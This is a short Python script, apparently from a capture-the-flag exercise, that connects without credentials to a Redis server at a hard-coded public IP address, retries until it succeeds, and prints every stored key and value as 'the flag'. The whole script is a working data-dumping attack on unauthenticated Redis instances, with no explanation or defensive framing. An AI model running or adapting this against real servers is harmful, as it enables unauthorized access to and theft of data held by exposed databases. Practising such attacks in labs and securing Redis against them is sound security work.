import redis

serve = '45.113.201.36' #设置服务器IP地址

print('Connecting the Server ('+serve+') ...')
while True:
    try:
        r = redis.StrictRedis(host=serve, port=6379)
        keys = r.keys()
        print('We got the flag:')
        for key in keys:
            value = r.get(key)
            print(key, value)
        break
    except:
        print('Error: Connection timed out')
        pass
